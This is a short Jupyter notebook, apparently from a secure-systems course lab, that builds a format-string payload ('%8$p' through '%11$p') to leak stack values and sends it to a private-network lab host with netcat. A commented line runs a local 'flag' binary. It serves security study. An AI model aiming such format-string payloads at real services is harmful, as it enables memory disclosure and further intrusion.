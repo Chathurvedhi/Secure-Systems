{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "username = b\"yolo\\n\"\n",
    "payload = b\"%8$p.\" + b\"%9$p.\" + b\"%10$p.\" + b\"%11$p.\" + b\"\\n\"\n",
    "\n",
    "exp_file_name = \"payload1.exp\"\n",
    "exp_out = open(exp_file_name,'wb')\n",
    "exp_out.write(username)\n",
    "exp_out.write(payload)\n",
    "exp_out.close()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import os\n",
    "import sys\n",
    "\n",
    "os.system(\"netcat 10.21.235.155 1023 < payload1.exp > output1.txt\")\n",
    "#os.system(\"./flag < payload2.exp > output2.txt\")\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.9"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
